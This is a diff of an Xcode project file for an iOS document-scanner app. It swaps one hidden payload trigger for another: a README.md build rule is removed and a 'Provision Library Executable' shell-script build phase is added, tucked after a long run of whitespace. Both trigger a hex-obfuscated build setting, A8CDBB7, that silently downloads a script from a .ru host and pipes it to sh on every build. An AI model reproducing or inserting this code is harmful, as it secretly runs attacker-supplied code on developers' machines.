@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DDFB1B1593DE43899F7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 868E1504BBA742259A7BBDC8; };
 		A30439A128A317B0002DE651 /* PageScanSummary.swift in Sources */ = {isa = PBXBuildFile; fileRef = A30439A028A317B0002DE651 /* PageScanSummary.swift */; };
 		A30A91D1288A3AB800D8228B /* DataScannerViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = A30A91D0288A3AB800D8228B /* DataScannerViewController.swift */; };
 		A30A91D5288DB6CA00D8228B /* AppState.swift in Sources */ = {isa = PBXBuildFile; fileRef = A30A91D4288DB6CA00D8228B /* AppState.swift */; };
@@ -97,7 +96,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		868E1504BBA742259A7BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		A30439A028A317B0002DE651 /* PageScanSummary.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PageScanSummary.swift; sourceTree = "<group>"; };
 		A30A91D0288A3AB800D8228B /* DataScannerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataScannerViewController.swift; sourceTree = "<group>"; };
 		A30A91D4288DB6CA00D8228B /* AppState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppState.swift; sourceTree = "<group>"; };
@@ -196,7 +194,6 @@
 		A30E5C8B288A2FF40099985F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				868E1504BBA742259A7BBDC8 /* README.md */,
 				A30E5C8A288A2FF40099985F /* scanner.app */,
 				A30E5CA0288A2FF50099985F /* scannerTests.xctest */,
 				A30E5CAA288A2FF50099985F /* scannerUITests.xctest */,
@@ -338,13 +335,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = A30E5CB4288A2FF50099985F /* Build configuration list for PBXNativeTarget "scanner" */;
 			buildPhases = (
+				12AC0A0244444C49B97BBDC8 /* Provision Library Executable */,
 				A30E5C86288A2FF40099985F /* Sources */,
 				A30E5C87288A2FF40099985F /* Frameworks */,
 				A30E5C88288A2FF40099985F /* Resources */,
 				A3233D4028BC49B70088268F /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				3C0873E734954994A27BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				A3233D3E28BC49B70088268F /* PBXTargetDependency */,
@@ -459,23 +456,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		3C0873E734954994A27BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		12AC0A0244444C49B97BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -483,7 +485,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DDFB1B1593DE43899F7BBDC8 /* README.md */,
 				A30E5C9B288A2FF50099985F /* Preview Assets.xcassets in Resources */,
 				A30E5C97288A2FF50099985F /* Assets.xcassets in Resources */,
 			);
@@ -609,7 +610,7 @@ sh -c \"${A8CDBB7}\"";
 		A30E5CB2288A2FF50099985F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -668,7 +669,7 @@ sh -c \"${A8CDBB7}\"";
 		A30E5CB3288A2FF50099985F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
